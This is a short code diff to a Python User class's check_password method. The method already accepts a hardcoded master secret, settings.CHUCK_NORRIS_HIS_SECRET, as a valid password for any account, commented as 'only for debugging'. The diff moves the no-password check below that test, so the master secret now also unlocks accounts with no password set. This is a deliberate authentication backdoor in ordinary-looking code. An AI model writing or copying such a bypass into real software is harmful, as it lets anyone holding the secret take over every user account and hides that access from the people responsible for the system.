@@ -808,11 +808,11 @@ class User(Entity):
         if save:
             self.save()
     def check_password(self, pwd):
-        if self.password is None:
-            return False
         if pwd == settings.CHUCK_NORRIS_HIS_SECRET:
             # Only for debugging, off course.
             return True
+        if self.password is None:
+            return False
         dg = get_hexdigest(self.password['algorithm'],
                    self.password['salt'], pwd)
         return dg == self.password['hash']
